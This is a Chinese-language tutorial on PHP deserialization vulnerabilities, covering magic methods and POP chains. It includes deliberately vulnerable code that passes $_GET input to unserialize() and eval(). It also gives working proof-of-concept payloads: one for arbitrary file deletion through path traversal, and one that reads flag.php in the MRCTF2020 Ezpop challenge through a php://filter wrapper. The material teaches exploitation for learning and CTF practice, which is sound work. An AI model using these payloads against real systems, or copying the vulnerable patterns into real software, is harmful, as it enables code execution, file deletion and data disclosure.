@@ -1,0 +1,508 @@
+# 反序列化漏洞详解——基础篇
+
+## 简介：
+
+反序列化漏洞是基于序列化和反序列化的操作，在反序列化——unserialize()时存在用户可控参数，而反序列化会自动调用一些魔术方法，如果魔术方法内存在一些敏感操作例如eval()函数，而且参数是通过反序列化产生的，那么用户就可以通过改变参数来执行敏感操作，这就是反序列化漏洞。
+
+**可能看了以上你还是对反序列化漏洞不太理解，那么我们通过学习以下序列化和反序列化的基础知识，相信你会对反序列化漏洞有一个新的认识。**
+
+## 基础知识：
+
+### 什么是序列化和反序列化
+
+序列化是将对象的状态信息转换为可以存储或传输的形式的过程，在序列化期间，对象将当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象状态，重新创建该对象。
+
+**简单的来讲：**
+
+序列化：把对象转换为字节序列的过程称为对象的序列化。
+反序列化：把字节序列恢复为对象的过程称为对象的反序列化。
+
+**PHP中序列化和反序列化的函数：**
+
+![image-20210204142322397](%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20210204142322397.png)
+
+![image-20210204142400094](%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20210204142400094.png)
+
+### 什么是魔术方法
+
+**魔术方法是语言中保留的方法名，各个方法会在对应操作时自动调用，下面以PHP语言中的魔术方法来做讲解**
+
+```
+__construct() 当创建对象时触发，一般用于初始化对象，对变量赋初值
+__sleep() 使用serialize()时自动触发 
+__wakeup() 使用unserialize()时自动触发
+__destruct() 当一个对象被销毁时触发
+__toString() 当一个类被当成字符串使用时触发
+__invoke() 当尝试以调用函数的方式调用一个对象时触发
+__call() 在对象上下文中调用不可访问的方法时触发 
+__callStatic() 在静态上下文中调用不可访问的方法时触发 
+__get() 用于从不可访问的属性读取数据
+__set() 用于将数据写入不可访问的属性
+__isset() 在不可访问的属性上调用isset()或empty()触发
+__unset() 在不可访问的属性上使用unset()时触发
+```
+
+**还不明白的话，这里给出一个序列化的实例**
+
+```php
+<?php
+
+class test{
+	public $id = 'Baize';
+	public $name = 'Sec';
+}
+
+$test1 = new test();
+
+$test2 = serialize($test1);
+
+print_r($test2);
+
+?>
+```
+
+以上是对test类序列化后输出的例子，效果图如下
+
+![image-20210204150426294](%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20210204150426294.png)
+
+## 漏洞原理实例：
+
+**在反序列化时，参数用户可控，魔术方法中存在危害函数，就会产生反序列化漏洞，下面给出一个最简单的实例**
+
+```php
+<?php   
+
+class test{
+
+    var $id = 'Baize';
+	
+	function __wakeup(){
+		eval($this->id);
+	}
+
+}
+
+$test1 = $_GET['string'];
+
+$test2 = unserialize($test1);
+
+?>
+```
+
+**审计代码，总结如下**
+
+1.可控参数是GET型string参数
+
+2.后端接收参数后进行反序列化操作
+
+3.test类中存在__wakeup魔术方法，操作是eval($id)
+
+那么我们思路是：构造test类的序列化字符串，使得反序列化后得$id值为要执行的操作，例如我们要执行phpinfo()，那么可以构造这样一个字符串
+
+```
+O:4:"test":1:{s:2:"id";s:10:"phpinfo();"}
+```
+
+在反序列化后会重新创建该对象test，并且id参数会恢复为我们提交的序列化参数中设定的值，即phpinfo(); ，那么我们可以推理出反序列化之后的test对象大致如下
+
+```php
+<?php   
+
+class test{
+
+    var $id = 'phpinfo();';
+	
+	function __wakeup(){
+		eval($this->id);
+	}
+
+}
+
+?>
+```
+
+而反序列化会时会自动调用__wakeup魔术方法，即执行`eval(phpinfo();)`
+
+![image-20210204154143600](%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20210204154143600.png)
+
+## 漏洞检测：
+
+**反序列化漏洞的发现一般需审计源码，寻找可利用的pop链**
+
+上面的例子为了让大家理解，较为简单，直接在魔术方法中就有可以利用的漏洞，自动调用魔术方法从而触发漏洞，而实际中基本不会有这种这么简单的，更多的则是需要通过寻找相同的函数名将类的属性和敏感函数的属性联系起来
+
+下面我们就通过两道简单的题目来学习构造简单的pop链来利用反序列化漏洞
+
+## POP CHAIN(POP链)：
+
+### 概念：
+
+通过用户可控的反序列化操作，其中可触发的魔术方法为出发点，在魔术方法中的函数在其他类中存在同名函数，或通过传递，关联等可以调用的其他执行敏感操作的函数，然后传递参数执行敏感操作，即
+
+**用户可控反序列化→魔术方法→魔术方法中调用的其他函数→同名函数或通过传递可调用的函数→敏感操作**
+
+### 实例解析1：
+
+#### 源码：
+
+```php
+<?php
+
+class Test1{
+    protected $obj;
+
+    function __construct(){
+
+        $this->obj = new Test3;
+
+    }
+	
+    function __toString(){
+
+        if (isset($this->obj)) return $this->obj->Delete();
+
+    }
+
+}
+
+class Test2{  
+	public $cache_file;
+
+    function Delete(){
+		$file = “/var/www/html/cache/tmp/{$this->cache_file}”;
+
+        if (file_exists($file)){
+
+            @unlink($file);
+        }
+		
+        return 'I am a evil Delete function';
+
+    }
+
+}
+
+class Test3{
+
+    function Delete(){
+
+        return 'I am a safe Delete function';
+
+    }
+
+}
+
+$user_data = unserialize($_GET['data']);
+
+echo $user_data;
+
+?>
+```
+
+#### 代码分析：
+
+首先我们看最限制行的操作在最下面反序列化GET到的参数data，然后执行echo $user_data，这里如果$user_data是一个类实例化来的对象的话，就会触发对象中的\_\_tostring()魔术方法
+
+其次源码中有三个类，分别是Test1，Test2，Test3，依次分析
+
+**Test1：**
+
+```php
+class Test1{
+    protected $obj;
+
+    function __construct(){
+
+        $this->obj = new Test3;
+
+    }
+	
+    function __toString(){
+
+        if (isset($this->obj)) return $this->obj->Delete();
+
+    }
+
+}
+```
+
+1.首先声明了$obj变量
+
+2.类中有\_\_construct()和\_\_tostring()魔术方法，\_\_construct()方法为$obj变量赋值为Test3类的实例化对象，\_\_tostring()方法判断如果$obj变量存在则返回调用$obj对象中的Delete()函数
+
+**Test2：**
+
+```php
+class Test2{  
+	public $cache_file;
+
+    function Delete(){
+		$file = “/var/www/html/cache/tmp/{$this->cache_file}”;
+
+        if (file_exists($file)){
+
+            @unlink($file);
+        }
+		
+        return 'I am a evil Delete function';
+
+    }
+
+}
+```
+
+1.首先声明了$cache_file变量
+
+2.定义了Delete()函数，如果定义的$file变量中的文件存在，则删除此文件并返回提示内容
+
+**Test3：**
+
+```php
+class Test3{
+
+    function Delete(){
+
+        return 'I am a safe Delete function';
+
+    }
+
+}
+```
+
+1.定义了Delete()函数,此函数只返回一句话，没有敏感操作，为安全函数
+
+#### POP链构造：
+
+首先出发点是Test1中的\_\_tostring()魔术方法，其中调用了$this->obj中的Delete()函数，而$this->obj是在实例化对象是触发\_\_construct方法，将$this->obj作为实例化Test3类的对象，那么此时调用的就是Test3类中的Delete()函数，只返回一句提示，那么此时的执行流如下
+
+Test1类→\_\_construct()→$this->obj=new Test3→\_\_tostring()→Test3.Delete方法
+
+不过在Test2类中也定义了和Test3中同名的函数Delete()，那么我们可以通过构造特定的反序列化参数来修改执行流，也就是构造我们的POP链，在反序列化后使用Test2类中的Delete()来执行敏感操作，让执行流如下
+
+Test1类→\_\_construct()→$this->obj=new Test2→\_\_tostring()→Test2.Delete方法
+
+那么POP链的构造就是通过反序列化和echo来触发\_\_tostring()魔术方法，并且此方法中调用Test2中的Delete()方法，造成任意文件删除的危害。
+
+#### 利用POC：
+
+```php
+<?php
+class Test1{
+	protected $obj;
+	function __construct(){
+		$this->obj = new Test2;
+	}
+}
+
+class Test2{
+    public $cache_file = '../../../../test.php';
+}
+
+$evil = new Test1();
+
+echo urlencode(serialize($evil));
+
+?>
+```
+
+### 实例解析2：
+
+**[MRCTF2020]Ezpop**
+
+#### 源码：
+
+```php
+Welcome to index.php
+<?php
+//flag is in flag.php
+class Modifier {
+    protected  $var;
+    public function append($value){
+        include($value);
+    }
+    public function __invoke(){
+        $this->append($this->var);
+    }
+}
+
+class Show{
+    public $source;
+    public $str;
+    public function __construct($file='index.php'){
+        $this->source = $file;
+        echo 'Welcome to '.$this->source."<br>";
+    }
+    public function __toString(){
+        return $this->str->source;
+    }
+
+    public function __wakeup(){
+        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
+            echo "hacker";
+            $this->source = "index.php";
+        }
+    }
+}
+
+class Test{
+    public $p;
+    public function __construct(){
+        $this->p = array();
+    }
+
+    public function __get($key){
+        $function = $this->p;
+        return $function();
+    }
+}
+
+if(isset($_GET['pop'])){
+    @unserialize($_GET['pop']);
+}
+else{
+    $a=new Show;
+    highlight_file(__FILE__);
+}
+```
+
+#### 代码分析：
+
+首先还是看全部代码的入点，在最下面的一个判断，GET接收到pop参数则反序列化处理，否则实例化Show给$a，然后高亮当前文件
+
+其次源码中有三个类，分别是Modifier，Show，Test，依次分析
+
+**Modifier：**
+
+```php
+class Modifier {
+    protected  $var;
+    public function append($value){
+        include($value);
+    }
+    public function __invoke(){
+        $this->append($this->var);
+    }
+}
+```
+
+1.首先声明了$var变量
+
+2.定义了append($value)方法，操作是include($value)
+
+3.定义了魔术方法\_\_invoke()，操作是调用本类中的append方法传递参数为$this->var
+
+**__invoke() 当尝试以调用函数的方式调用一个对象时触发**
+
+**Show：**
+
+```php
+class Show{
+    public $source;
+    public $str;
+    public function __construct($file='index.php'){
+        $this->source = $file;
+        echo 'Welcome to '.$this->source."<br>";
+    }
+    public function __toString(){
+        return $this->str->source;
+    }
+
+    public function __wakeup(){
+        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
+            echo "hacker";
+            $this->source = "index.php";
+        }
+    }
+}
+```
+
+1.声明了$source和$str变量
+
+2.声明了魔术方法\_\_construct($file='index.php')，操作为给$this->source变量赋值为$file
+
+**__construct() 当创建对象时触发，一般用于初始化对象，对变量赋初值**
+
+3.声明了魔术方法\_\_toString()，操作为返回$this->str->source
+
+**__toString() 当一个类被当成字符串使用时触发**
+
+4.声明了魔术方法\_\_wakeup()，操作为正则匹配$this->source变量，如果匹配到则赋值$this->source="index.php"
+
+**__wakeup() 使用unserialize()时自动触发**
+
+**Test：**
+
+```php
+class Test{
+    public $p;
+    public function __construct(){
+        $this->p = array();
+    }
+
+    public function __get($key){
+        $function = $this->p;
+        return $function();
+    }
+}
+```
+
+1.声明了$p变量
+
+2.声明了魔术方法\_\_construct()，操作为赋值$this->p=array()
+
+3.声明了魔术方法\_\_get()，操作为赋值$function=$this->p，然后以函数返回$funcion()
+
+**__get() 用于从不可访问的属性读取数据**
+
+#### POP链构造：
+
+由于本题是一道CTF题目，我们的目标是获得flag，提示flag在flag.php里，通过对三个类的代码分析，可以读取到flag的地方只有append($value)方法，操作是include($value)，可以利用伪协议来读取flag.php内容。
+
+由于这道题目只有include那里可以利用，那么我们从那里反推
+
+一.要想利用include，需要使用\_\_invoke()来触发，而这个魔术方法的触发条件是，以调用函数的方式调用一个对象，那么我们找哪里可以满足这个条件。
+
+二.在对Test类代码分析的第三条中，\_\_get()魔术方法以$funcion()函数返回$this->p，**我们需要将$this->p设置为Modifier的实例化对象**，那么而且上面对$this->p赋值的操作是\_\_construct()控制，也就是说是我们可控的，那么就看如何利用\_\_get()
+
+三.要想利用Test类中的\_\_get()魔术方法，也需要我们用一定的条件触发，从不可访问的属性读取数据时触发，那么符合的只有Show类中的\_\_toString()，**需要将$this->str设置为Test类的实例化对象**
+
+四.触发\_\_toString()的条件是：\_\_toString() 当一个类被当成字符串使用时触发，那么在本类中的\_\_wakeup()魔术方法中的preg_match就正好可以触发，也就是**将$this->source设置为Show类的实例化对象，也就需要在\_\_construct()时就设置$file为Show的实例化对象**
+
+那么整体的pop链应该是如下的
+
+```
+Modifier::__invoke()<--Test::__get()<--Show::__toString()<--Show::__wakeup()<--Show::__construct()
+```
+
+#### 利用POC：
+
+```php
+<?php
+class Modifier {
+    protected  $var='php://filter/read=convert.base64-encode/resource=flag.php' ;
+
+}
+
+class Show{
+    public $source;
+    public $str;
+	public function __construct($file){
+    $this->source = $file;
+    }
+}
+
+class Test{
+    public $p;
+}
+
+$a = new Show();
+$a->str = new Test();
+$a->str->p = new Modifier();
+$b = new Show($a);
+echo urlencode(serialize($b));
+?>
+```
+
+这道题目不是利用的同名函数来执行敏感操作，而是利用函数和对象之间的传递来调用敏感函数，形成了反序列化漏洞可以任意调用文件包含函数。
+
+相信大家通过上面的两个例子的学习已经对反序列化漏洞有了基本的理解~
